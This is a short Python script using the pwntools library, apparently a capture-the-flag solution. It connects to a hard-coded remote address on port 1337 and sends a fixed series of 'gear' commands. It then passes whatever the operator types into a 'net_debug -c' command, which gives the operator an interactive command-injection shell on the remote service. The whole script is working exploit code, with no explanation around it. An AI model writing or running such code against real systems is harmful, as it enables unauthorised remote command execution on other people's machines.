#!/usr/bin/python3

from pwn import *
import signal

r = remote("13.39.149.80", 1337)

def ctrl_c(sig, frame):
    print("\n\n[!] Saliendo...\n")
    r.sendline(b"disconnect")

signal.signal(signal.SIGINT, ctrl_c)

r.recvuntil(b">> ")
r.sendline(b"gear -o 2")
r.recvuntil(b">> ")
r.sendline(b"gear -i 3")
r.recvuntil(b">> ")
r.sendline(b"gear -d 1")
r.recvuntil(b">> ")

while True:
    cmd = input(">> ")
    r.sendline("net_debug -c %s" % cmd)
    output = r.recvuntil(b">> ")
    print(output.decode())


r.sendline("disconnect")
